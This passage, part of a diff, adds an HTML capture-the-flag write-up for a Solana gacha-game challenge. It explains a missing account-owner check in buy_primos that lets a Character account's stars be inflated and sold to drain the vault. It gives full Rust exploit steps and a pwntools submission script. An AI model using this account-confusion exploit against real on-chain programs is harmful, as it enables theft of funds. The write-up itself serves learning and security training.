+    <span class="k">let</span> <span class="n">stats</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">CHARACTERS</span><span class="p">[</span><span class="n">character_id</span> <span class="k">as</span> <span class="nb">usize</span><span class="p">];</span>
+    <span class="k">let</span> <span class="n">character</span> <span class="o">=</span> <span class="n">Character</span> <span class="p">{</span>
+        <span class="n">id</span><span class="p">:</span> <span class="n">character_id</span><span class="p">,</span>
+        <span class="n">stars</span><span class="p">:</span> <span class="n">stats</span><span class="py">.stars</span> <span class="k">as</span> <span class="nb">u64</span><span class="p">,</span>
+        <span class="n">name</span><span class="p">:</span> <span class="n">stats</span><span class="py">.name</span><span class="nf">.to_string</span><span class="p">(),</span>
+        <span class="n">owner</span><span class="p">:</span> <span class="o">*</span><span class="n">useraccount_info</span><span class="py">.key</span><span class="p">,</span>
+    <span class="p">};</span>
+
+    <span class="k">let</span> <span class="n">price</span> <span class="o">=</span> <span class="p">(</span><span class="n">character</span><span class="py">.stars</span> <span class="k">as</span> <span class="nb">u64</span><span class="p">)</span> <span class="o">*</span> <span class="n">BASE_PRICE</span><span class="p">;</span>
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">useraccount</span><span class="py">.primos</span> <span class="o">&gt;=</span> <span class="n">price</span><span class="p">);</span>
+
+    <span class="c1">// probably good enough /shrug</span>
+    <span class="k">const</span> <span class="n">CHARACTER_SIZE</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
+
+    <span class="nf">invoke_signed</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="nn">system_instruction</span><span class="p">::</span><span class="nf">create_account</span><span class="p">(</span>
+            <span class="n">user_info</span><span class="py">.key</span><span class="p">,</span>
+            <span class="n">character_info</span><span class="py">.key</span><span class="p">,</span>
+            <span class="mi">10</span><span class="p">,</span>
+            <span class="n">CHARACTER_SIZE</span><span class="p">,</span>
+            <span class="n">program</span><span class="p">,</span>
+        <span class="p">),</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="n">user_info</span><span class="nf">.clone</span><span class="p">(),</span> <span class="n">character_info</span><span class="nf">.clone</span><span class="p">()],</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="p">[</span>
+            <span class="s">b"CHARACTER"</span><span class="p">,</span>
+            <span class="o">&amp;</span><span class="n">useraccount_info</span><span class="py">.key</span><span class="nf">.to_bytes</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="p">[</span><span class="n">character_id</span><span class="p">],</span>
+            <span class="o">&amp;</span><span class="p">[</span><span class="n">character_bump</span><span class="p">],</span>
+        <span class="p">]],</span>
+    <span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="n">useraccount</span><span class="py">.primos</span> <span class="o">-=</span> <span class="n">price</span><span class="p">;</span>
+    <span class="n">useraccount</span><span class="py">.characters</span><span class="nf">.push</span><span class="p">(</span><span class="n">character_id</span><span class="p">);</span>
+
+    <span class="n">useraccount</span><span class="nf">.serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow_mut</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+    <span class="n">character</span><span class="nf">.serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">character_info</span><span class="py">.data</span><span class="nf">.borrow_mut</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h5 id="sell_account"><code class="language-plaintext highlighter-rouge">sell_account</code></h5>
+
+<p>Sell the account containing the <code class="language-plaintext highlighter-rouge">Characters</code> and get lamports in exchange.
+This function checks that the accounts passed are right and then character by character checks that the program that contains them are owned by the challenge program and that the <code class="language-plaintext highlighter-rouge">UserAccount</code> we passed owns the <code class="language-plaintext highlighter-rouge">Character</code>, checks that you didn’t try to sell the same <code class="language-plaintext highlighter-rouge">Character</code> twice and then adds the value (<code class="language-plaintext highlighter-rouge">(character.stars as u64 * BASE_PRICE * LOSS_RATIO) / 100</code>) to the total. We then receive the total amount of the sale in lamports.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// monkaTOS</span>
+<span class="k">fn</span> <span class="nf">sell_account</span><span class="p">(</span><span class="n">program</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">,</span> <span class="n">accounts</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">AccountInfo</span><span class="p">],</span> <span class="n">vault_bump</span><span class="p">:</span> <span class="nb">u8</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">ProgramResult</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">account_iter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">accounts</span><span class="nf">.iter</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">useraccount_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">user_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">let</span> <span class="n">vault_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="c1">// further accounts passed are all the characters that the user owns</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">useraccount</span> <span class="o">=</span> <span class="nn">UserAccount</span><span class="p">::</span><span class="nf">deserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">vault_address</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">create_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">b"VAULT"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">vault_bump</span><span class="p">]],</span> <span class="n">program</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="o">*</span><span class="n">vault_info</span><span class="py">.key</span><span class="p">,</span> <span class="n">vault_address</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">useraccount_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">vault_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+
+    <span class="nd">assert!</span><span class="p">(</span><span class="n">user_info</span><span class="py">.is_signer</span><span class="p">);</span>
+    <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">useraccount</span><span class="py">.owner</span><span class="p">,</span> <span class="o">*</span><span class="n">user_info</span><span class="py">.key</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">price</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">sold</span> <span class="o">=</span> <span class="nn">HashSet</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+    <span class="k">for</span> <span class="n">character_info</span> <span class="k">in</span> <span class="n">account_iter</span><span class="nf">.take</span><span class="p">(</span><span class="n">useraccount</span><span class="py">.characters</span><span class="nf">.len</span><span class="p">())</span> <span class="p">{</span>
+        <span class="k">let</span> <span class="n">character</span> <span class="o">=</span> <span class="nn">Character</span><span class="p">::</span><span class="nf">deserialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="n">character_info</span><span class="py">.data</span><span class="nf">.borrow</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+        <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">character_info</span><span class="py">.owner</span><span class="p">,</span> <span class="n">program</span><span class="p">);</span>
+        <span class="nd">assert_eq!</span><span class="p">(</span><span class="n">character</span><span class="py">.owner</span><span class="p">,</span> <span class="o">*</span><span class="n">useraccount_info</span><span class="py">.key</span><span class="p">);</span>
+
+        <span class="c1">// haha nice try</span>
+        <span class="nd">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">sold</span><span class="nf">.contains</span><span class="p">(</span><span class="o">&amp;</span><span class="n">character</span><span class="py">.id</span><span class="p">));</span>
+
+        <span class="n">price</span> <span class="o">+=</span> <span class="p">(</span><span class="n">character</span><span class="py">.stars</span> <span class="k">as</span> <span class="nb">u64</span> <span class="o">*</span> <span class="n">BASE_PRICE</span> <span class="o">*</span> <span class="n">LOSS_RATIO</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
+        <span class="n">sold</span><span class="nf">.insert</span><span class="p">(</span><span class="n">character</span><span class="py">.id</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="o">**</span><span class="n">vault_info</span><span class="py">.lamports</span><span class="nf">.borrow_mut</span><span class="p">()</span> <span class="o">-=</span> <span class="n">price</span><span class="p">;</span>
+    <span class="o">**</span><span class="n">user_info</span><span class="py">.lamports</span><span class="nf">.borrow_mut</span><span class="p">()</span> <span class="o">+=</span> <span class="n">price</span><span class="p">;</span>
+
+    <span class="n">useraccount</span><span class="py">.owner</span> <span class="o">=</span> <span class="o">*</span><span class="n">program</span><span class="p">;</span>
+    <span class="n">useraccount</span><span class="nf">.serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">useraccount_info</span><span class="py">.data</span><span class="nf">.borrow_mut</span><span class="p">()[</span><span class="o">..</span><span class="p">])</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>After seeing that the <code class="language-plaintext highlighter-rouge">buy_primos</code> functions takes a <code class="language-plaintext highlighter-rouge">UserAccount</code> but does not check the owner of the account and that it only modifies the <code class="language-plaintext highlighter-rouge">primos</code> field we can assume that by just giving it a similar enought structure we can write the field that is placed at the same offset of <code class="language-plaintext highlighter-rouge">primos</code>, like the <code class="language-plaintext highlighter-rouge">stars</code> field in <code class="language-plaintext highlighter-rouge">Character</code>.</p>
+
+<p>So by passing to <code class="language-plaintext highlighter-rouge">buy_primos</code> function a <code class="language-plaintext highlighter-rouge">Character</code> and an <code class="language-plaintext highlighter-rouge">amount</code> big enough to steal enough lamports, we can see that the <code class="language-plaintext highlighter-rouge">stars</code> field gets increased of <code class="language-plaintext highlighter-rouge">amount</code>, so we can use that function to increase the value of a character that we can then sell to get <code class="language-plaintext highlighter-rouge">character.stars as u64 * BASE_PRICE * LOSS_RATIO) / 100</code> lamports.</p>
+
+<h3 id="exploit-sequence">Exploit sequence</h3>
+
+<h4 id="setup-all-the-variables">Setup all the variables</h4>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">account_iter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">accounts</span><span class="nf">.iter</span><span class="p">();</span>
+<span class="k">let</span> <span class="n">user</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">gft</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">character_info</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">useraccount</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">vault</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">sys</span> <span class="o">=</span> <span class="nf">next_account_info</span><span class="p">(</span><span class="n">account_iter</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+<span class="k">let</span> <span class="n">vault_bump</span> <span class="o">=</span> <span class="n">instruction_data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+<span class="k">let</span> <span class="n">character_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">account_name</span> <span class="o">=</span> <span class="s">"f1x3r"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h4 id="create-an-account">Create an account</h4>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">invoke</span><span class="p">(</span>
+    <span class="o">&amp;</span><span class="nf">create_useraccount</span><span class="p">(</span><span class="o">*</span><span class="n">gft</span><span class="py">.key</span><span class="p">,</span> <span class="o">*</span><span class="n">user</span><span class="py">.key</span><span class="p">,</span> <span class="n">account_name</span><span class="p">),</span>
+    <span class="o">&amp;</span><span class="p">[</span><span class="n">useraccount</span><span class="nf">.clone</span><span class="p">(),</span> <span class="n">user</span><span class="nf">.clone</span><span class="p">(),</span> <span class="n">_sys</span><span class="nf">.clone</span><span class="p">()],</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h4 id="buy-enough-primos-to-buy-a-character-eg-800">Buy enough <code class="language-plaintext highlighter-rouge">primos</code> to buy a <code class="language-plaintext highlighter-rouge">Character</code>, e.g. 800</h4>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">invoke</span><span class="p">(</span>
+    <span class="o">&amp;</span><span class="nf">buy_primos</span><span class="p">(</span><span class="o">*</span><span class="n">gft</span><span class="py">.key</span><span class="p">,</span> <span class="o">*</span><span class="n">user</span><span class="py">.key</span><span class="p">,</span> <span class="n">account_name</span><span class="p">,</span> <span class="mi">800</span><span class="p">),</span>
+    <span class="o">&amp;</span><span class="p">[</span>
+        <span class="n">useraccount</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">user</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">vault</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">sys</span><span class="nf">.clone</span><span class="p">(),</span>
+    <span class="p">],</span>
+<span class="p">);</span>
+
+</code></pre></div></div>
+<h4 id="buy-a-character">Buy a character</h4>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">invoke</span><span class="p">(</span>
+    <span class="o">&amp;</span><span class="nf">buy_character</span><span class="p">(</span><span class="o">*</span><span class="n">gft</span><span class="py">.key</span><span class="p">,</span> <span class="o">*</span><span class="n">user</span><span class="py">.key</span><span class="p">,</span> <span class="n">account_name</span><span class="p">,</span> <span class="n">character_id</span><span class="p">),</span>
+    <span class="o">&amp;</span><span class="p">[</span>
+        <span class="n">useraccount</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">user</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">character_info</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">vault</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">sys</span><span class="nf">.clone</span><span class="p">(),</span>
+    <span class="p">],</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<h4 id="call-enough-buy_primos-with-the-character-we-just-bought-in-place-of-an-account-eg-303-to-empty-the-vault">Call enough <code class="language-plaintext highlighter-rouge">buy_primos</code> with the <code class="language-plaintext highlighter-rouge">Character</code> we just bought in place of an <code class="language-plaintext highlighter-rouge">Account</code>, e.g. 303 (to empty the vault)</h4>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// the amount of stars to add to our character</span>
+<span class="k">let</span> <span class="n">amount</span> <span class="o">=</span> <span class="mi">303</span><span class="p">;</span>
+
+<span class="c1">// create the instruction</span>
+<span class="k">let</span> <span class="n">exp</span> <span class="o">=</span> <span class="n">Instruction</span> <span class="p">{</span>
+    <span class="n">program_id</span><span class="p">:</span> <span class="o">*</span><span class="n">gft</span><span class="py">.key</span><span class="p">,</span>
+    <span class="n">accounts</span><span class="p">:</span> <span class="nd">vec!</span><span class="p">[</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="o">*</span><span class="n">character_info</span><span class="py">.key</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="o">*</span><span class="n">user</span><span class="py">.key</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="o">*</span><span class="n">vault</span><span class="py">.key</span><span class="p">,</span> <span class="kc">false</span><span class="p">),</span>
+        <span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new_readonly</span><span class="p">(</span><span class="nn">system_program</span><span class="p">::</span><span class="nf">id</span><span class="p">(),</span> <span class="kc">false</span><span class="p">),</span>
+    <span class="p">],</span>
+    <span class="n">data</span><span class="p">:</span> <span class="nn">GachaInstruction</span><span class="p">::</span><span class="n">BuyPrimos</span> <span class="p">{</span> <span class="n">amount</span><span class="p">,</span> <span class="n">vault_bump</span> <span class="p">}</span>
+        <span class="nf">.try_to_vec</span><span class="p">()</span>
+        <span class="nf">.unwrap</span><span class="p">(),</span>
+<span class="p">};</span>
+
+<span class="c1">// invoke the instruction</span>
+<span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">invoke</span><span class="p">(</span>
+    <span class="o">&amp;</span><span class="n">exp</span><span class="p">,</span>
+    <span class="o">&amp;</span><span class="p">[</span>
+        <span class="n">character_info</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">user</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">vault</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">sys</span><span class="nf">.clone</span><span class="p">(),</span>
+    <span class="p">],</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<h4 id="sell-the-account-with-the-forged-character">Sell the account with the forged <code class="language-plaintext highlighter-rouge">Character</code></h4>
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">invoke</span><span class="p">(</span>
+    <span class="o">&amp;</span><span class="nf">sell_account</span><span class="p">(</span><span class="o">*</span><span class="n">gft</span><span class="py">.key</span><span class="p">,</span> <span class="o">*</span><span class="n">user</span><span class="py">.key</span><span class="p">,</span> <span class="n">account_name</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">character_id</span><span class="p">]),</span>
+    <span class="o">&amp;</span><span class="p">[</span>
+        <span class="n">useraccount</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">user</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">vault</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">character_info</span><span class="nf">.clone</span><span class="p">(),</span>
+        <span class="n">sys</span><span class="nf">.clone</span><span class="p">(),</span>
+    <span class="p">],</span>
+<span class="p">);</span>
+</code></pre></div></div>
+<h4 id="profit">Profit</h4>
+
+<h3 id="python-script-to-send-our-program-to-the-server">python script to send our program to the server</h3>
+
+<p>We have to connect to the server, send our compiled program size and our program and then retrieve the challenge program and user program pubkey, we can then send our accounts and data to call our program’s entrypoint</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">solana.publickey</span> <span class="kn">import</span> <span class="n">PublicKey</span>
+<span class="kn">from</span> <span class="nn">solana.system_program</span> <span class="kn">import</span> <span class="n">SYS_PROGRAM_ID</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s">"localhost"</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">5000</span><span class="p">)</span>
+<span class="n">solve_so</span> <span class="o">=</span> <span class="s">"solve.so"</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="c1"># read our program from file
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">solve_so</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">solve_so_data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="c1"># send program's size to server
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"len"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">solve_so_data</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+<span class="c1"># send program to server
+</span><span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">solve_so_data</span><span class="p">)</span>
+
+<span class="c1"># receive challenge program pubkey
+</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"program: "</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+<span class="n">program</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"program: </span><span class="si">{</span><span class="n">program</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># receive user pubkey
+</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"user: "</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+<span class="n">user</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"user: </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># find useraccount pubkey and bump
+</span><span class="n">useraccount</span><span class="p">,</span> <span class="n">useraccount_bump</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">.</span><span class="n">find_program_address</span><span class="p">(</span>
+    <span class="p">[</span>
+        <span class="sa">b</span><span class="s">"ACCOUNT"</span><span class="p">,</span>
+        <span class="nb">bytes</span><span class="p">(</span><span class="n">PublicKey</span><span class="p">(</span><span class="n">user</span><span class="p">)),</span>
+        <span class="sa">b</span><span class="s">"f1x3r"</span><span class="p">,</span>
+    <span class="p">],</span>
+    <span class="n">program</span><span class="p">,</span>
+<span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"useraccount: </span><span class="si">{</span><span class="n">useraccount</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># find character pubkey and bump
+</span><span class="n">character</span><span class="p">,</span> <span class="n">character_bump</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">.</span><span class="n">find_program_address</span><span class="p">(</span>
+    <span class="p">[</span>
+        <span class="sa">b</span><span class="s">"CHARACTER"</span><span class="p">,</span>
+        <span class="nb">bytes</span><span class="p">(</span><span class="n">useraccount</span><span class="p">),</span>
+        <span class="nb">int</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"little"</span><span class="p">)</span>
+    <span class="p">],</span>
+    <span class="n">program</span><span class="p">,</span>
+<span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"character: </span><span class="si">{</span><span class="n">character</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># find vault pubkey and bump
+</span><span class="n">vault</span><span class="p">,</span> <span class="n">vault_bump</span> <span class="o">=</span> <span class="n">PublicKey</span><span class="p">.</span><span class="n">find_program_address</span><span class="p">([</span><span class="sa">b</span><span class="s">"VAULT"</span><span class="p">],</span> <span class="n">program</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"vault: </span><span class="si">{</span><span class="n">vault</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># put together the accounts array, each account can be `signer`(`s`), `writable`(`w`), both(`ws`) or none(`q` or any other char, not `s` or `w`, for that matter) of them and that is specified by the first field of the tuple
+</span><span class="n">accounts</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">"ws"</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">"q"</span><span class="p">,</span> <span class="n">program</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">"w"</span><span class="p">,</span> <span class="n">character</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">"w"</span><span class="p">,</span> <span class="n">useraccount</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">"w"</span><span class="p">,</span> <span class="n">vault</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">"q"</span><span class="p">,</span> <span class="n">SYS_PROGRAM_ID</span><span class="p">.</span><span class="n">to_base58</span><span class="p">()),</span>
+<span class="p">]</span>
+
+<span class="c1"># encode our data (here we only need the vault bump)
+</span><span class="n">ix_data</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">vault_bump</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"num accounts:"</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+<span class="c1"># send the number of accounts and the accounts
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">accounts</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">access</span><span class="p">,</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">access</span> <span class="o">+</span> <span class="sa">b</span><span class="s">" "</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"ix len:"</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+<span class="c1"># send data size and data
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ix_data</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">ix_data</span><span class="p">)</span>
+
+<span class="c1"># wait for any answer from the server and log it
+</span><span class="n">output</span> <span class="o">=</span> <span class="n">printable</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">()).</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="run-the-exploit">run the exploit</h3>
+
